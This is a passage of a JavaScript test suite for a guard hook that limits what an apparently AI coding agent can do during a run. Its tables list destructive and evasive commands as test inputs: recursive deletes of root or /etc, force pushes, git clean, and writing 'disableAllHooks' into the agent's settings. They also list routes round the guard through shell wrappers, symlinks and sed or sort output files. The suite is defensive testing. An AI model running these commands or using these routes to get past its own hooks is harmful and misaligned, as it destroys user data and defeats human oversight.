    // sed: the `w` command writes the pattern space to a file, with or without -i.
    ["sed -n 'w .meeseeks/state.json' /etc/hostname", 'sed w command writes an outfile'],
    ["sed 's/a/b/w .meeseeks/state.json' /etc/hostname", 'sed s///w flag writes an outfile'],
    ["sed 'W .meeseeks/state.json' /etc/hostname", 'sed W command writes an outfile'],
    ["sed -i 's/a/b/w .meeseeks/state.json' input.txt", 'sed w with -i, the outfile is not the -i target'],
    ["cd .meeseeks && sed -n 'w state.json' /etc/hostname", 'sed w after cd into the tree'],
    ['bash -c "sed -n \'w .meeseeks/state.json\' /etc/hostname"', 'sed w wrapped in a shell'],
    // sort: -o names the output file.
    ['sort -o .meeseeks/state.json /etc/hostname', 'sort -o writes an outfile'],
    ['sort --output=.meeseeks/state.json /etc/hostname', 'sort --output= writes an outfile'],
    ['cd .meeseeks && sort -o state.json /etc/hostname', 'sort -o after cd into the tree'],
    ['bash -c "sort -o .meeseeks/state.json /etc/hostname"', 'sort -o wrapped in a shell'],
    // xxd: -r reverses a hex dump into its outfile operand.
    ['xxd -r -p /tmp/hex.txt .meeseeks/state.json', 'xxd -r writes an outfile'],
    ['cd .meeseeks && xxd -r -p /tmp/hex.txt state.json', 'xxd -r after cd into the tree'],
    ['bash -c "xxd -r -p /tmp/hex.txt .meeseeks/state.json"', 'xxd -r wrapped in a shell'],
    // git config -f: writes an arbitrary named file — the fail-open default in the old carve-out.
    ['git config -f .meeseeks/state.json evil.key pwned', 'git config -f writes a named file'],
    ['git config --file .meeseeks/state.json evil.key pwned', 'git config --file long form'],
    ['git config --file=.meeseeks/state.json evil.key pwned', 'git config --file= glued form'],
    ['git config -f .meeseeks/state.json --get some.key', 'git config -f is denied even to READ from a protected file'],
    ['cd .meeseeks && git config -f state.json evil.key pwned', 'git config -f after cd into the tree'],
    ['bash -c "git config -f .meeseeks/state.json evil.key pwned"', 'git config -f wrapped in a shell'],
  ];
  for (const [command, label] of denied) {
    it(`denies ${label}: ${command}`, () => {
      assertDenied(bashEvent(command), 'protected-state');
    });
  }

  // The benign neighbours the tightened carve-out must still ALLOW, and the two it deliberately
  // gives up. Values, not truthiness — each verdict is asserted, not assumed.
  it('git: a pure --get names nothing protected and is allowed', () => {
    assertAllowed(bashEvent('git config --get core.editor'));
  });
  it('git: a read subcommand naming the tree is still carved out', () => {
    assertAllowed(bashEvent('git log --oneline .meeseeks/state.json'));
  });
  it('git: git show of a protected pathspec is a read', () => {
    assertAllowed(bashEvent('git show HEAD:.meeseeks/state.json'));
  });
  it('grep -o (only-matching) is a stdout read, not an output file', () => {
    assertAllowed(bashEvent('grep -o seenFailing .meeseeks/state.json'));
  });
  it('od -w (width) is a stdout read, not an output file', () => {
    assertAllowed(bashEvent('od -w16 .meeseeks/state.json'));
  });
  it('hexdump remains for a hex read of the tree, replacing xxd', () => {
    assertAllowed(bashEvent('hexdump -C .meeseeks/state.json'));
  });
  // The two acceptable fail-closed losses: a reader with an unrecognized -o flag, and the whole
  // of sed. Both deny a benign read of a protected path — the cheap side of the asymmetry.
  it('less -o (a reader with a genuine output-file flag) is denied on the carve-out', () => {
    assertDenied(bashEvent('less -o /tmp/log .meeseeks/state.json'), 'protected-state');
  });
  it("sed WITHOUT -i is now denied naming a protected path — sed is not carved out at all", () => {
    assertDenied(bashEvent("sed 's/a/b/' .meeseeks/state.json"), 'protected-state');
  });
  it('sort with no output flag, reading to stdout, is denied — sort is removed from the read set', () => {
    assertDenied(bashEvent('sort .meeseeks/state.json'), 'protected-state');
  });
});

describe('cd tracking: the working directory a write actually lands in', () => {
  it('denies a relative write after cd into the protected directory', () => {
    assertDenied(bashEvent('cd .meeseeks && echo "{}" > state.json'), 'protected-state');
  });

  it('denies a traversal from a subdirectory the chain moved into', () => {
    assertDenied(bashEvent('cd sub && echo x > ../.meeseeks/state.json'), 'protected-state');
  });

  it('allows an ordinary relative write after an ordinary cd', () => {
    assertAllowed(bashEvent('cd /tmp && echo x > scratch.txt'));
  });
});

describe('allowed: writer-command neighbours', () => {
  // Every writer in the table needs its benign twin, or the table is a blanket.
  const allowed = [
    ['touch /tmp/stamp', 'touch outside the protected set'],
    ['mkdir dist', 'creating an ordinary directory'],
    ['chmod +x scripts/run.sh', 'marking a script executable'],
    ['tee /tmp/build.log', 'tee to an ordinary log'],
    ['cp src/a.mjs src/b.mjs', 'an ordinary copy'],
    ['mv build/out.js dist/out.js', 'an ordinary move'],
    ['install -m 755 bin/tool /tmp/tool', 'an ordinary install'],
    ["sed -i 's/a/b/' src/index.mjs", 'an in-place edit of ordinary source'],
    ['ln -s .meeseeks/state.json /tmp/pointer', 'a link whose NAME is ordinary (the target is only read)'],
    ['git add src/index.mjs', 'staging ordinary source'],
    ['git checkout feature-branch', 'checking out a branch'],
    ['git rm docs/old.md', 'git-deleting an ordinary file'],
    ['curl -o /tmp/dl.json https://example.com', 'a download to an ordinary path'],
    ['curl -sSf https://example.com', 'a download to stdout, no output flag at all'],
    ['wget -O /tmp/page.html https://example.com', 'wget to an ordinary path'],
  ];
  for (const [command, label] of allowed) {
    it(`allows ${label}: ${command}`, () => {
      assertAllowed(bashEvent(command));
    });
  }
});

// ---------------------------------------------------------------------------
// protected-settings — the guard's kill switch (PLAN item 28)
// ---------------------------------------------------------------------------

describe('blocked: protected-settings', () => {
  // The hooks system honors `disableAllHooks`, and the target repo's own settings files
  // participate in its precedence. One write of `{"disableAllHooks": true}` unguards every
  // later child. Gated on the run marker exactly like protected-state: outside a run these
  // are ordinary files the operator edits freely.
  const deniedWrites = [
    ['.claude/settings.json', 'the project settings'],
    ['.claude/settings.local.json', 'the local override'],
    ['./.claude/settings.json', 'a leading dot segment'],
    ['src/../.claude/settings.json', 'a traversal'],
    [`${FIXTURE_CWD}/.claude/settings.json`, 'the absolute path'],
    ['packages/app/.claude/settings.local.json', 'a nested project directory'],
  ];
  for (const [filePath, label] of deniedWrites) {
    it(`denies a Write to ${label}: ${filePath}`, () => {
      assertDenied(pathEvent('pretooluse-write.json', 'file_path', filePath), 'protected-settings');
    });
  }

  it('denies an Edit of .claude/settings.json', () => {
    assertDenied(pathEvent('pretooluse-edit.json', 'file_path', '.claude/settings.json'), 'protected-settings');
  });

  const deniedCommands = [
    ['echo \'{"disableAllHooks":true}\' > .claude/settings.json', 'the kill switch through a redirect'],
    ["sh -c 'cat > .claude/settings.json'", 'the kill switch inside a wrapped shell'],
    ['cp killswitch.json .claude/settings.local.json', 'copied over the local override'],
    ['tee .claude/settings.json', 'written through tee'],
    ['mv staged.json .claude/settings.json', 'moved into place'],
    ["sed -i 's/false/true/' .claude/settings.json", 'edited in place'],
  ];
  for (const [command, label] of deniedCommands) {
    it(`denies ${label}: ${command}`, () => {
      assertDenied(bashEvent(command), 'protected-settings');
    });
  }

  it('is scoped to a run: the operator edits their own settings freely', () => {
    assertAllowed(pathEvent('pretooluse-write.json', 'file_path', '.claude/settings.json'), OPERATOR);
    assertAllowed(bashEvent('echo \'{"disableAllHooks":true}\' > .claude/settings.json'), OPERATOR);
  });
});

describe('allowed: protected-settings neighbours', () => {
  const allowedCommands = [
    ['cat .claude/settings.json', 'reading the settings'],
    ['echo x > .claude-settings-backup', 'a sibling whose name only resembles the directory'],
    ['echo x > docs/settings.json', 'a settings.json not under .claude'],
    ['echo x > .claude/commands/build.md', 'a different file under .claude'],
    ['mkdir -p .claude', 'creating the directory itself'],
  ];
  for (const [command, label] of allowedCommands) {
    it(`allows ${label}: ${command}`, () => {
      assertAllowed(bashEvent(command));
    });
  }

  const allowedWrites = [
    ['settings.json', 'a root-level settings.json with no .claude parent'],
    ['.claude/hooks.json', 'a different json under .claude'],
    ['.claude/settings.json.bak', 'a backup name beside the settings (mv into place is still denied)'],
    ['config/.claude-settings/settings.json', 'a parent that only resembles .claude'],
  ];
  for (const [filePath, label] of allowedWrites) {
    it(`allows a Write to ${label}: ${filePath}`, () => {
      assertAllowed(pathEvent('pretooluse-write.json', 'file_path', filePath));
    });
  }
});

describe('isProtectedSettingsPath', () => {
  const cases = [
    ['.claude/settings.json', true],
    ['.claude/settings.local.json', true],
    ['./.claude/settings.json', true],
    ['packages/app/.claude/settings.json', true],
    [`${FIXTURE_CWD}/.claude/settings.local.json`, true],
    ['src/../.claude/settings.json', true],
    ['settings.json', false],
    ['docs/settings.json', false],
    ['.claude/other.json', false],
    ['.claude/settings.json.bak', false],
    ['.claude-backup/settings.json', false],
    ['.claude/nested/settings.json', false],
    ['', false],
  ];
  for (const [candidate, expected] of cases) {
    it(`${JSON.stringify(candidate)} -> ${expected}`, () => {
      assert.equal(isProtectedSettingsPath(String(candidate), FIXTURE_CWD), expected);
    });
  }
});

describe('the kill switch is pinned shut in the blob handed to every child (PLAN item 28)', () => {
  // The other half of the same item: the guard denies the write, and the driver STATES
  // disableAllHooks in the settings source it owns rather than inheriting whatever the
  // tree says. Which source the CLI lets win is a fact about another binary — only
  // `test/live/guard-killswitch.live.test.mjs` can hold that half.
  it('states disableAllHooks: false for every phase', () => {
    for (const phase of Object.keys(PHASE_PERMISSIONS)) {
      const args = claudeArgs({ model: 'm', phase });
      const blob = JSON.parse(args[args.indexOf('--settings') + 1]);
      assert.equal(blob.disableAllHooks, false, `${phase} inherits disableAllHooks instead of stating it`);
    }
  });
});

// ---------------------------------------------------------------------------
// unresolvable-write — uncertainty resolves toward deny, inside a run
// ---------------------------------------------------------------------------

describe('blocked: unresolvable-write', () => {
  // "Nothing defaults to pass" applied to the write detector: a content-writing command
  // whose destination cannot be known before it runs could be aiming at any protected
  // path, and inside a run that possibility is a denial, not a shrug. The same doctrine
  // rm-recursive has enforced on its own operands since the beginning.
  const denied = [
    ['echo x > "$OUT"', 'a redirect to an unexpanded variable'],
    ['npm test | tee "$LOG"', 'tee to an unexpanded variable'],
    ['cp report.json "$DEST"', 'a copy to an unexpanded variable'],
    ['cd "$DIR" && echo x > build.log', 'a relative write after an unresolvable cd'],
    ['eval "$CMD"', 'eval of a value nothing can read'],
    ['echo .meeseeks/x | xargs rm', 'a writer fed its targets from stdin'],
  ];
  for (const [command, label] of denied) {
    it(`denies ${label}: ${command}`, () => {
      assertDenied(bashEvent(command), 'unresolvable-write');
    });
  }

  it('denies command nesting too deep to analyse', () => {
    let cmd = 'echo hi';
    for (let i = 0; i < 6; i += 1) cmd = `echo "$(${cmd})"`;
    assertDenied(bashEvent(cmd), 'unresolvable-write');
  });

  it('routes an unresolvable target that NAMES a protected path to that family instead', () => {
    // The generic rule is the fallback; a `$HOME/.meeseeks/...` destination is already
    // recognisable and should say what it actually is.
    assertDenied(bashEvent('cp /tmp/fake.json "$HOME/.meeseeks/state.json"'), 'protected-state');
    assertDenied(bashEvent('cp killswitch.json "$HOME/.claude/settings.json"'), 'protected-settings');
  });
});

describe('allowed: unresolvable-write neighbours', () => {
  const allowed = [
    ['echo x > /tmp/build.log', 'a resolvable, unprotected redirect'],
    ['cd "$DIR" && echo x > /tmp/abs.log', 'an absolute write after an unresolvable cd'],
    ['rm -f "$TMPFILE"', 'deleting an unresolvable single file — deletion is the lenient class'],
    ['ls src | xargs cat', 'xargs feeding a reader'],
    ['eval "npm test"', 'eval of a literal, harmless command'],
    ['echo x > out-$(date +%s).log', 'a substitution in the name of an unprotected pattern is still unresolvable — see below'],
  ];
  // The last case above is actually denied — its target has an expansion. Keep the table honest:
  const genuinelyAllowed = allowed.slice(0, -1);
  for (const [command, label] of genuinelyAllowed) {
    it(`allows ${label}: ${command}`, () => {
      assertAllowed(bashEvent(command));
    });
  }

  it('denies the substitution-named target, because the name cannot be resolved', () => {
    assertDenied(bashEvent('echo x > out-$(date +%s).log'), 'unresolvable-write');
  });

  it('allows nesting at the analysis depth, denying only past it', () => {
    let cmd = 'echo hi';
    for (let i = 0; i < 5; i += 1) cmd = `echo "$(${cmd})"`;
    assertAllowed(bashEvent(cmd));
  });

  it('is scoped to a run: an operator may redirect into a variable', () => {
    assertAllowed(bashEvent('echo x > "$OUT"'), OPERATOR);
    assertAllowed(bashEvent('cd "$DIR" && echo x > build.log'), OPERATOR);
  });
});

// ---------------------------------------------------------------------------
// R23 — realpath on both sides of the positional compare
// ---------------------------------------------------------------------------

describe('R23: symlinks and case variants cannot dodge the positional rule', () => {
  // A real tree on disk, because realpath is the thing under test. Symlink creation can
  // fail on Windows without privilege; those cases skip rather than lie.
  const root = mkdtempSync(path.join(os.tmpdir(), 'meeseeks-guard-realpath-'));
  mkdirSync(path.join(root, '.meeseeks'), { recursive: true });
  writeFileSync(path.join(root, '.meeseeks', 'state.json'), '{}', 'utf8');
  mkdirSync(path.join(root, '.meeseeks-notes'), { recursive: true });

  /**
   * @param {string} target
   * @param {string} linkPath
   * @param {'junction' | 'file'} kind
   * @returns {boolean}
   */
  function trySymlink(target, linkPath, kind) {
    try {
      symlinkSync(target, linkPath, kind);
      return true;
    } catch {
      return false;
    }
  }

  const dirLink = trySymlink(path.join(root, '.meeseeks'), path.join(root, 'innocent'), 'junction');
  const dangling = trySymlink(path.join(root, 'nowhere', 'x'), path.join(root, 'dangling'), 'file');
  const guardLink = trySymlink(GUARD, path.join(root, 'build-helper.mjs'), 'file');

  after(() => rmSync(root, { recursive: true, force: true }));

  /**
   * @param {string} filePath
   * @returns {Record<string, any>}
   */
  function writeAt(filePath) {
    const event = pathEvent('pretooluse-write.json', 'file_path', filePath);
    event.cwd = root;
    return event;
  }

  it('denies a Write through a symlink that resolves into .meeseeks', (t) => {
    if (!dirLink) return t.skip('symlinks unavailable on this platform');
    assertDenied(writeAt('innocent/state.json'), 'protected-state');
  });

  it('denies a not-yet-existing path whose deepest existing ancestor is that symlink', (t) => {
    // The components-phase pattern: the file does not exist, so the judgement realpaths the
    // deepest ancestor that does and rejoins the remainder.
    if (!dirLink) return t.skip('symlinks unavailable on this platform');
    assertDenied(writeAt('innocent/briefs/iter-001.md'), 'protected-state');
  });

  it('denies the same write through a shell redirect', (t) => {
    if (!dirLink) return t.skip('symlinks unavailable on this platform');
    const event = bashEvent('echo forged > innocent/state.json');
    event.cwd = root;
    assertDenied(event, 'protected-state');
  });

  it('allows the symlinked write outside a run', (t) => {
    if (!dirLink) return t.skip('symlinks unavailable on this platform');
    assertAllowed(writeAt('innocent/state.json'), OPERATOR);
  });

  it('allows the benign sibling .meeseeks-notes, on disk and not only on paper', () => {
    assertAllowed(writeAt('.meeseeks-notes/state.json'));
  });

  it('denies a write through a dangling symlink: realpath failure is a deny, not an allow', (t) => {
    // The write would CREATE the target, wherever the link points, and realpath cannot say
    // where that is. Inside a run, unresolvable is denied.
    if (!dangling) return t.skip('symlinks unavailable on this platform');
    assertDenied(writeAt('dangling'), 'unresolvable-write');
  });

  it('denies a Write through a symlink that resolves to the guard itself', (t) => {
    if (!guardLink) return t.skip('symlinks unavailable on this platform');
    assertDenied(writeAt('build-helper.mjs'), 'protected-guard');
  });

  it('unit: isProtectedStatePath follows the symlink', (t) => {
    if (!dirLink) return t.skip('symlinks unavailable on this platform');
    assert.equal(isProtectedStatePath('innocent/state.json', root), true);
    assert.equal(isProtectedStatePath('.meeseeks-notes/state.json', root), false);
  });

  it('denies writing the TARGET of a .meeseeks that is itself a symlink', (t) => {
    // The root side of "realpath both sides": when `.meeseeks` points elsewhere, the write
    // that never spells the name still lands in driver-owned state.
    const aliasRoot = mkdtempSync(path.join(os.tmpdir(), 'meeseeks-guard-alias-'));
    mkdirSync(path.join(aliasRoot, 'real-state'), { recursive: true });
    const linked = trySymlink(path.join(aliasRoot, 'real-state'), path.join(aliasRoot, '.meeseeks'), 'junction');
    try {
      if (!linked) return t.skip('symlinks unavailable on this platform');
      const event = pathEvent('pretooluse-write.json', 'file_path', 'real-state/state.json');
      event.cwd = aliasRoot;
      assertDenied(event, 'protected-state');
    } finally {
      rmSync(aliasRoot, { recursive: true, force: true });
    }
  });

  it('denies writing the target of a settings file that is itself a symlink', (t) => {
    const aliasRoot = mkdtempSync(path.join(os.tmpdir(), 'meeseeks-guard-settings-'));
    mkdirSync(path.join(aliasRoot, '.claude'), { recursive: true });
    mkdirSync(path.join(aliasRoot, 'cfg'), { recursive: true });
    writeFileSync(path.join(aliasRoot, 'cfg', 'real-settings.json'), '{}', 'utf8');
    const linked = trySymlink(
      path.join(aliasRoot, 'cfg', 'real-settings.json'),
      path.join(aliasRoot, '.claude', 'settings.json'),
      'file',
    );
    try {
      if (!linked) return t.skip('symlinks unavailable on this platform');
      const event = pathEvent('pretooluse-write.json', 'file_path', 'cfg/real-settings.json');
      event.cwd = aliasRoot;
      assertDenied(event, 'protected-settings');
    } finally {
      rmSync(aliasRoot, { recursive: true, force: true });
    }
  });
});

// ---------------------------------------------------------------------------
// Category 2 — history-destroying git
// ---------------------------------------------------------------------------

describe('blocked: git-history', () => {
  const denied = [
    'git push --force',
    'git push -f origin main',
    'git push --force-with-lease origin main',
    'git push --force-with-lease=main origin main',
    'git push -uf origin main',
    `git -C ${FIXTURE_CWD} push --force`,
    'GIT_SSH_COMMAND="ssh -i key" git push --force',
    'git rebase -i HEAD~3',
    'git rebase --abort',
    "git filter-branch --tree-filter 'true' HEAD",
    'git reflog expire --expire=now --all',
    'npm run build && git push --force',
  ];
  for (const command of denied) {
    it(`denies ${command}`, () => {
      assertDenied(bashEvent(command), 'git-history');
    });
  }
});

describe('allowed: git-history neighbours', () => {
  const allowed = [
    ['git push', 'an ordinary push'],
    ['git push origin main', 'an ordinary push with a refspec'],
    ['git push -q origin main', 'a short flag that is not -f'],
    ['git push --set-upstream origin feature', 'a long flag that is not --force'],
    ['git push --follow-tags', 'another long flag that is not --force'],
    ['git fetch --force', 'force on a subcommand that destroys no history'],
    ['git commit -m "revert the botched rebase"', 'the word rebase inside a commit message'],
    ['git reflog', 'reading the reflog'],
    ['git reflog --date=iso', 'reading the reflog with a flag'],
    ['git reset --hard HEAD', 'the hard reset the ratchet itself performs'],
    ['git log --oneline -5', 'reading history'],
    ['git rev-parse HEAD', 'resolving a ref'],
  ];
  for (const [command, label] of allowed) {
    it(`allows ${label}: ${command}`, () => {
      assertAllowed(bashEvent(command));
    });
  }
});

// ---------------------------------------------------------------------------
// git clean — destroys the gitignored .meeseeks tree while naming no protected path
// ---------------------------------------------------------------------------

describe('blocked: git-clean (V2)', () => {
  // `.meeseeks/` is gitignored, so `git clean -x`/`-fdx` deletes the ratchet and the RED
  // evidence — and it names no protected path, so the floor cannot catch it. Any non-dry-run
  // git clean inside a run is refused; the recursion carries the rule into wrapped shells.
  const denied = [
    'git clean -fdx',
    'git clean -x',
    'git clean -fd',
    'git clean',
    'git clean --force',
    `git -C ${FIXTURE_CWD} clean -fdx`,
    "sh -c 'git clean -fdx'",
    'npm run build && git clean -xdf',
  ];
  for (const command of denied) {
    it(`denies ${command}`, () => {
      assertDenied(bashEvent(command), 'git-clean');
    });
  }
});

describe('allowed: git-clean neighbours', () => {
  const allowed = [
    ['git clean -n', 'a dry run with the short flag'],
    ['git clean --dry-run', 'a dry run with the long flag'],
    ['git clean -nfd', 'a dry run combined with other flags'],
    ['git status', 'a different subcommand'],
    ['git add .', 'staging, which is a different subcommand'],
    ['git stash', 'stashing, which is a different subcommand'],
    ['npm run clean', 'a clean script that is not git clean'],
  ];
  for (const [command, label] of allowed) {
    it(`allows ${label}: ${command}`, () => {
      assertAllowed(bashEvent(command));
    });
  }

  it('is scoped to a run: the operator may clean their own worktree', () => {
    assertAllowed(bashEvent('git clean -fdx'), OPERATOR);
  });
});

// ---------------------------------------------------------------------------
// Category 3 — recursive rm outside the temp directory
// ---------------------------------------------------------------------------

describe('blocked: rm-recursive', () => {
  const denied = [
    ['rm -rf node_modules', 'a project directory'],
    ['rm -rf /', 'the root'],
    ['rm -r src', 'recursive without -f'],
    ['rm -Rf build', 'capital -R'],
    ['rm --recursive --force dist', 'long flags'],
    ['sudo rm -rf /var/log', 'through sudo'],
    ['rm -rf /tmp/scratch ../secrets', 'one temp operand and one that escapes'],
    ['rm -rf "$BUILD_DIR"', 'a target that cannot be resolved before it runs'],
    ['rm -rf /tmp/../etc', 'a traversal that climbs out of /tmp'],
    ['rm -rf ~/Documents', 'the home directory'],
    ['rm -rf /tmp', 'the temp root itself, not something inside it'],
    ['rm -rf -- node_modules', 'operands after the end-of-flags marker'],
    ['npm ci && rm -rf src', 'the second command in a chain'],
  ];
  for (const [command, label] of denied) {
    it(`denies ${label}: ${command}`, () => {
      assertDenied(bashEvent(command), 'rm-recursive');
    });
  }
});

describe('allowed: rm-recursive neighbours', () => {
  const allowed = [
    ['rm package-lock.json', 'a non-recursive delete'],
    ['rm -f dist/bundle.js', 'force without recursion'],
    ['rm -rf /tmp/meeseeks-scratch', 'recursive delete inside /tmp'],
    ['rm -rf /tmp/a /tmp/b', 'several operands, all inside /tmp'],
    ['rm -rf /tmp/scratch 2>/dev/null', 'a redirected fd that is not an operand'],
    ['rm -rf', 'recursive flags with nothing to delete'],
    ['rmdir build', 'a different command whose name starts with rm'],
    ['npm run clean', 'a clean script that does not shell out to rm'],
  ];
  for (const [command, label] of allowed) {
    it(`allows ${label}: ${command}`, () => {
      assertAllowed(bashEvent(command));
    });
  }
});

// ---------------------------------------------------------------------------
// Category 4 — nested meeseeks
// ---------------------------------------------------------------------------

describe('blocked: nested-meeseeks', () => {
  const denied = [
    ['meeseeks', 'the bare command'],
    ['meeseeks "build me a thing"', 'the command with an idea'],
    ['/meeseeks', 'the slash command on its own'],
    ['claude -p "/meeseeks ship it"', 'the slash command handed to a claude child'],
    ['npm test && meeseeks', 'the second command in a chain'],
  ];
  for (const [command, label] of denied) {
    it(`denies ${label}: ${command}`, () => {
      assertDenied(bashEvent(command), 'nested-meeseeks');
    });
  }
});

describe('blocked: commands hidden inside a shell wrapper', () => {
  // Every rule keys off the command word, and `bash -c "..."` makes that word `bash`.
  // The wrapped command was invisible to all the rules, not only the nesting one.
  const denied = [
    ['bash -c "rm -rf /etc"', 'rm-recursive'],
    ["sh -c 'git push --force'", 'git-history'],
    ['bash -c "tee .meeseeks/config.json"', 'protected-state'],
    ["sh -c '/meeseeks'", 'nested-meeseeks'],
    ['zsh -c "rm -rf node_modules"', 'rm-recursive'],
  ];
  for (const [command, rule] of denied) {
    it(`denies ${command}`, () => {
      assertDenied(bashEvent(command), rule);
    });
  }

  it('leaves a harmless wrapped command alone', () => {
    assertAllowed(bashEvent('bash -c "npm test"'));
  });
});

describe('allowed: nested-meeseeks neighbours', () => {
  const allowed = [
    // Prose is not an invocation. The first version denied the slash command anywhere in
    // the line, and it caught a heredoc that merely mentioned the command in a code comment
    // — while this plugin was installed, on its own author, editing this file.
    ['echo "run /meeseeks to start a build"', 'the slash command quoted inside prose'],
    ['git commit -m "document the /meeseeks command"', 'the slash command in a commit message'],
    ['grep -rn "/meeseeks" docs/', 'searching the docs for the slash command'],
    ['printf "%s\\n" "usage: /meeseeks <path>"', 'the slash command inside usage text'],
    ['echo "I meeseeks you"', 'the word meeseeks in prose'],
    ['npm test -- test/meeseeks.test.mjs', 'a test file named after the plugin'],
    ['ls /daredevil', 'a path that merely starts with /meeseeks'],
    ['claude -p "summarize the meeseeks design"', 'a claude child that is not a meeseeks run'],
    ['git log --grep=meeseeks', 'searching history for the word'],
    ['cat docs/meeseeks-notes.md', 'a document named after the plugin'],
  ];
  for (const [command, label] of allowed) {
    it(`allows ${label}: ${command}`, () => {
      assertAllowed(bashEvent(command));
    });
  }
});

// ---------------------------------------------------------------------------
// Malformed input fails closed
// ---------------------------------------------------------------------------

describe('blocked: malformed-payload', () => {
  it('denies a payload that is not an object', () => {
    assertDenied('hello', 'malformed-payload');
  });

  it('denies a null payload', () => {
    assertDenied(null, 'malformed-payload');
  });

  it('denies an array payload', () => {
    assertDenied([], 'malformed-payload');
  });

  it('denies a Bash payload with no command', () => {
    const event = loadEvent('pretooluse-bash.json');
    delete event.tool_input.command;
    assertDenied(event, 'malformed-payload');
  });

  it('denies a Bash payload whose command is not a string', () => {
    const event = loadEvent('pretooluse-bash.json');
    event.tool_input.command = 42;
    assertDenied(event, 'malformed-payload');
  });
});

// ---------------------------------------------------------------------------
// Reasons, so a denial explains itself
// ---------------------------------------------------------------------------

describe('deny reasons', () => {
  it('names the runtime directory, and says the read side is open', () => {
    const result = evaluate(bashEvent("echo '{}' > .meeseeks/state.json"), { env: IN_RUN });
    assert.equal(
      result.decision === 'deny' ? result.reason : '',
      '.meeseeks/state.json is inside the .meeseeks runtime directory. It holds the ratchet, the configuration, ' +
        'the RED evidence, the archived briefs and the test reports — the state and evidence a run is judged by, ' +
        'which the run does not write (DESIGN.md §6). Reading it is fine; writing it from a run is not.',
    );
  });

  it('names the kill switch for a settings write', () => {
    const result = evaluate(pathEvent('pretooluse-write.json', 'file_path', '.claude/settings.json'), {
      env: IN_RUN,
    });
    const reason = result.decision === 'deny' ? result.reason : '';
    assert.equal(reason.includes('disableAllHooks'), true, reason);
    assert.equal(reason.includes('kill switch'), true, reason);
    assert.equal(reason.includes('PLAN item 28'), true, reason);
  });

  it('names the unresolvable target for a variable redirect', () => {
    const result = evaluate(bashEvent('echo x > "$OUT"'), { env: IN_RUN });
    assert.equal(
      result.decision === 'deny' ? result.reason : '',
      'Write target "$OUT" cannot be resolved before the command runs; unresolvable write targets are denied ' +
        'inside a run (DESIGN.md §6).',
    );
  });

  it('names recovery for a force push', () => {
    const result = evaluate(bashEvent('git push --force'));
    assert.equal(
      result.decision === 'deny' ? result.reason : '',
      'Force push is blocked so recovery stays possible (DESIGN.md §6).',
    );
  });

  it('names the resolved target for a recursive rm', () => {
    const result = evaluate(bashEvent('rm -rf node_modules'));
    assert.equal(
      result.decision === 'deny' ? result.reason : '',
      `Recursive rm outside the temp directory is blocked: ${path.resolve(FIXTURE_CWD, 'node_modules')} (DESIGN.md §6).`,
    );
  });

  it('names the unresolved target, not the resolved one, when rm cannot be evaluated', () => {
    // Without this the case is indistinguishable from an ordinary out-of-tmp denial:
    // both report rule `rm-recursive`, but only one proves the expansion branch ran.
    const result = evaluate(bashEvent('rm -rf "$BUILD_DIR"'));
    assert.equal(
      result.decision === 'deny' ? result.reason : '',
      'Recursive rm target "$BUILD_DIR" cannot be resolved before the command runs; unresolvable targets are denied (DESIGN.md §6).',
    );
  });

  it('names the no-nesting invariant for a nested run', () => {
    const result = evaluate(bashEvent('/meeseeks'));
    const reason = result.decision === 'deny' ? result.reason : '';
    assert.equal(
      reason.startsWith('meeseeks does not spawn meeseeks. Nested runs are blocked at the driver and at the hook'),
      true,
      reason,
    );
    assert.equal(reason.includes('CLAUDE.md invariant, DESIGN.md §13.6'), true, reason);
  });

  // The rule is a text match over command position, and heredoc bodies fed to a shell are
  // command position too. Ordinary heredoc bodies are data since R24, which retires the
  // trilogy of prose denials — but the sentence still explains itself for whatever prose
  // lands in command position next.
  it('says the denial is a text match, so prose about the command is diagnosable in seconds', () => {
    const result = evaluate(bashEvent('/meeseeks'));
    const reason = result.decision === 'deny' ? result.reason : '';
    assert.equal(reason.includes('TEXT match, not a detected invocation'), true, reason);
    assert.equal(reason.includes('heredoc'), true, reason);
    assert.equal(reason.includes('reword rather'), true, reason);
  });

  it('still denies, and denies identically, whatever the sentence now says', () => {
    // The message changed; the behaviour must not have. A prompt invoking the command
    // is refused exactly as before.
    assertDenied(bashEvent('/meeseeks'), 'nested-meeseeks');
    assertDenied(bashEvent("sh -c '/meeseeks'"), 'nested-meeseeks');
  });
});

// ---------------------------------------------------------------------------
// Units the rules are built out of
// ---------------------------------------------------------------------------

describe('isProtectedStatePath', () => {
  const cases = [
    ['.meeseeks/state.json', true],
    ['.meeseeks/config.json', true],
    ['./.meeseeks/state.json', true],
    ['src/../.meeseeks/state.json', true],
    [`${FIXTURE_CWD}/.meeseeks/config.json`, true],
    // Everything under the directory, at any depth, including names not yet invented.
    ['.meeseeks/bloopers.log', true],
    ['.meeseeks/red-evidence.json', true],
    ['.meeseeks/state.json.bak', true],
    ['.meeseeks/briefs/iter-004.md', true],
    ['.meeseeks/reports/nested/deep/unit.json', true],
    ['.meeseeks', true],
    // Names that only resemble one. Matching is on whole segments.
    ['mymeeseeks/state.json', false],
    ['state.json', false],
    ['docs/.meeseeks-notes/state.json', false],
    ['.meeseeksrc', false],
    ['', false],
  ];
  for (const [candidate, expected] of cases) {
    it(`${JSON.stringify(candidate)} -> ${expected}`, () => {
      assert.equal(isProtectedStatePath(String(candidate), FIXTURE_CWD), expected);
    });
  }
});

describe('tokenizeCommand', () => {
  it('splits a chain into one segment per command', () => {
    const { segments } = tokenizeCommand('npm ci && rm -rf src');
    assert.deepStrictEqual(
      segments.map((segment) => segment.map((token) => token.value)),
      [
        ['npm', 'ci'],
        ['rm', '-rf', 'src'],
      ],
    );
  });

  it('strips quotes and keeps the quoted text as one token', () => {
    const { segments } = tokenizeCommand('git commit -m "revert the botched rebase"');
    assert.deepStrictEqual(segments[0].map((token) => token.value), [
      'git',
      'commit',
      '-m',
      'revert the botched rebase',
    ]);
  });

  it('keeps redirection targets and fd numbers out of the operand stream', () => {
    const { segments } = tokenizeCommand('rm -rf /tmp/scratch 2>/dev/null');
    assert.deepStrictEqual(segments[0].map((token) => token.value), ['rm', '-rf', '/tmp/scratch']);
  });

  it('captures output-redirect targets as write destinations rather than dropping them', () => {
    // Dropping them was how `echo x > file` hid the whole attack in the discarded half.
    const { segments, redirects } = tokenizeCommand('echo hi > out.txt');
    assert.deepStrictEqual(segments.map((segment) => segment.map((token) => token.value)), [['echo', 'hi']]);
    assert.deepStrictEqual(
      redirects.map((r) => ({ value: r.target.value, segment: r.segment })),
      [{ value: 'out.txt', segment: 0 }],
    );
  });

  it('does not capture input redirects or fd duplication as write targets', () => {
    const { redirects } = tokenizeCommand('sort < in.txt 2>&1');
    assert.deepStrictEqual(redirects, []);
  });

